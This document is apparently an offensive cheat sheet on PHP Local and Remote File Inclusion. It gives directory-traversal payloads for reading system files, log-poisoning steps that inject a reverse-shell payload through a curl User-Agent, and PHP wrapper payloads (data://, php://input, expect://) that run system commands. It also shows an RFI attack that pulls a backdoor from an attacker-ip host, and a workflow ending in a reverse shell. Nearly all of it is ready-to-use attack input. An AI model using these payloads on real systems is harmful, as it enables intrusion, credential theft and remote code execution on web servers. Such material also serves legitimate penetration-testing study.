File Transfer Pivoting
Concept

Local File Inclusion (LFI) allows an attacker to include files from the local system via vulnerable parameters such as:

?page=../../../../etc/passwd
?page=../../../../boot.ini

Typical vulnerable code:

include($_GET['page']);
Detection

Basic LFI test

?page=../../../../../../../../etc/passwd
?page=../../../../../../../../boot.ini

If the response includes file contents → LFI confirmed.

Exploitation

Directory traversal

../../../../../../../../etc/passwd

Windows example

../../../../../../../../windows/system32/drivers/etc/hosts

Common goals

  • Read configuration files
  • Extract credentials
  • Access source code
  • Achieve RCE via wrappers or log poisoning
Log Poisoning

Linux log paths

/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/nginx/access.log

Windows log paths

C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\inetpub\logs\LogFiles\W3SVC1\u_exYYMMDD.log

Step 1 – Inject payload

curl -A "<PHP_REVERSHELL>" http://target/

Step 2 – Trigger LFI

?page=../../../../../../../../../var/log/apache2/access.log&cmd=id

Step 3 – Handle spaces

cmd=ls%20-la

Windows trigger

?page=../../../../../../../../xampp/apache/logs/access.log&cmd=dir
PHP Wrappers

php://filter (read source code)

?page=php://filter/convert.base64-encode/resource=index.php

Decode output:

echo BASE64_OUTPUT | base64 -d

data:// (code execution)

?page=data://text/plain,<?php system('id'); ?>

data:// base64

?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg==

php://input

curl -X POST -d "<?php system('ls'); ?>" \
"http://target/index.php?page=php://input"

expect:// (if enabled)

?page=expect://id
RFI

Remote File Inclusion requires allow_url_include=On.

Example attack

python3 -m http.server 80
?page=http://attacker-ip/simple-backdoor.php&cmd=ls

Reverse shell placeholder

<PHP_REVERSHELL>
Workflow
  1. Confirm LFI with /etc/passwd
  2. Try Windows equivalent (boot.ini)
  3. Read source using php://filter
  4. Attempt log poisoning
  5. Try PHP wrappers for RCE
  6. Escalate to reverse shell
